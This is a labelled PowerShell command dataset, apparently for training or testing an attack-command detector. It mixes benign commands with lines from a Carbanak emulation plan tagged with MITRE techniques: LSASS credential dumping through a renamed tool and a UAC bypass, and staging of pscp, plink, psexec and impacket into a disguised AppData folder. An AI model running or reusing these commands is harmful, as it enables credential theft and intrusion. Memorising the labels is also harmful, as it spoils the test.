@@ -1,0 +1,19 @@
+Copy-Item -Path 'C:\Users\John\Documents' -Destination 'E:\Backup\Documents' -Recurse     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item attackkatz.exe smrs.exe;
+powershell.exe -ExecutionPolicy Bypass -File uac-bypass.ps1 "cmd.exe /C $pwd\smrs.exe > $pwd\MGsCOxPSNK.txt"     // GROUND-TRUTH : T1003.001: OS Credential Dumping: LSASS Memory (credential-dumping) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+cat MGsCOxPSNK.txt;     // GROUND-TRUTH : T1003.001: OS Credential Dumping: LSASS Memory (credential-dumping) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Start-Process cmd -ArgumentList '/c echo This is a simple benign command'     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-EventLog -LogName Application -Newest 10 -Message *     // LABEL: BENIGN-POWERSHELL-COMMAND
+New-Item -ItemType Directory -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver;
+Move-Item pscp.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe;
+Move-Item psexec.py C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\psexec.py;
+Move-Item impacket_exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\runtime;
+Move-Item plink.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\plink.exe;
+Move-Item tiny.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\tiny.exe;     // GROUND-TRUTH : T1105: Ingress Tool Transfer (command-and-control) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+$env:ProgramFiles=\C:\Program Files (x86)\""     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ChildItem C:\ -Recurse | Out-File C:\ScriptLog.txt     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-WinEvent -LogName Application -FilterXPath '*[System[Provider[@Name='Microsoft-Windows-PowerShell']]]' | Where-Object {$_.LevelDisplayName -like 'Warning' -and $_.Message -like 'Login failed*' } | Select-Object -First 5     // LABEL: BENIGN-POWERSHELL-COMMAND
+New-Item -ItemType Directory -Path 'C:\ProgramData\AppData' -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-Service | Where-Object {$_.Status -eq 'Running'} | Format-Table Name, DisplayName -AutoSize     // LABEL: BENIGN-POWERSHELL-COMMAND
+Test-Connection -ComputerName 'server01' -Count 1 -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Set-ExecutionPolicy Unrestricted     // LABEL: BENIGN-POWERSHELL-COMMAND
